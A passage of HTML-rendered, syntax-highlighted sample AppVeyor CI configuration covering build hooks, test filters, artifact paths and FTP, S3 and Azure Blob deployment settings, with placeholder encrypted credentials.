&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;include_nuget_references&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# add -IncludeReferencedProjects option while packaging NuGet artifacts&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# MSBuild verbosity level&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;verbosity&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;quiet|minimal|normal|detailed&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# scripts to run before build&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;before_build&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# to run your custom scripts instead of automatic MSBuild&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;build_script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# scripts to run after build (working directory and environment changes are persisted from the previous steps)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;after_build&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# scripts to run *after* solution is built and *before* automatic packaging occurs (web apps, NuGet packages, Azure Cloud Services)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;before_package&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# to disable automatic builds&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#build: off&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#       tests configuration       #&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# to run tests against only selected assemblies and/or categories&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;assemblies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;only&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;asm1.dll&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;asm2.dll&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;categories&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;only&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;UI&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;E2E&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# to run tests against all except selected assemblies and/or categories&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#test:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  assemblies:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    except:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#      - asm1.dll&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#      - asm2.dll&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  categories:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    except:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#      - UI&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#      - E2E&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# to run tests from different categories as separate jobs in parallel&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#test:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  categories:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    - A            # A category common for all jobs&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    - [UI]         # 1st job&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    - [DAL, BL]    # 2nd job&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# scripts to run before tests (working directory and environment changes are persisted from the previous steps such as &amp;#34;before_build&amp;#34;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;before_test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;echo script1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;ps&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Write-Host &amp;#34;script1&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# to run your custom scripts instead of automatic tests&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;test_script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;echo This is my custom test script&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# scripts to run after tests&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;after_test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# to disable automatic tests&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#test: off&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#      artifacts configuration    #&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;artifacts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# pushing a single file&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;test.zip&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# pushing a single file with environment variable in path and &amp;#34;Deployment name&amp;#34; specified&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;MyProject\bin\$(configuration)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;myapp&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# pushing entire folder as a zip archive&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;logs&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# pushing all *.nupkg files in build directory recursively&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;**\*.nupkg&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#     deployment configuration    #&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# providers: Local, FTP, WebDeploy, AzureCS, AzureBlob, S3, NuGet, Environment&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# provider names are case-sensitive!&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;deploy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# FTP deployment provider settings&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;FTP&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;protocol&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ftp|ftps|sftp&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ftp.myserver.com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;eYKZKFkkEvFYWX6NfjZIVw==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;application&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;active_mode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;beta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# enable alternative FTP library for &amp;#39;ftp&amp;#39; and &amp;#39;ftps&amp;#39; modes&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;debug&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# show complete FTP log&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Amazon S3 deployment provider settings&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;S3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;access_key_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ABcd==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secret_access_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ABcd==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;bucket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;my_bucket&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;artifact&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;set_public&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Azure Blob storage deployment provider settings&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;AzureBlob&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;storage_account_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ABcd==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;storage_access_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ABcd==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;container&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;my_container&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;artifact&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Web Deploy deployment provider settings&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
